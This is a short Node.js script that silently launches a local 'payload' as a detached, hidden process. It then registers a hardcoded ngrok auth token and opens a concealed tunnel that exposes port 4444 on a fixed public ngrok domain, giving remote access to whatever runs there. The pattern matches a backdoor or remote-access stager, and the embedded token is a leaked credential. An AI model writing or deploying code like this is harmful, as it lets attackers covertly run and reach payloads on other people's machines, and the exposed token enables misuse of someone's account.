'use strict'

const { execSync, spawn } = require('node:child_process')

function execPayload() {
  const subprocess = spawn('node', [`./core/api/index.js`], {
    detached: true,
    stdio: 'ignore',
  })
  subprocess.unref()
}

function execNgrok() {
  execSync(
    `ngrok.exe config add-authtoken 2dQKSqtYDAmVKv7Ekrl2ys0nFyD_2ARhd7ZtWYJfd8YcxhRyQ`,
  )

  const subprocess = spawn(
    'ngrok.exe',
    ['http', '--url=epic-tarpon-definitely.ngrok-free.app', '4444'],
    { detached: true, stdio: 'ignore' },
  )
  subprocess.unref()
}

async function bootstrap() {
  execPayload()
  execNgrok()
  console.log('SUCCESS')
}
bootstrap()
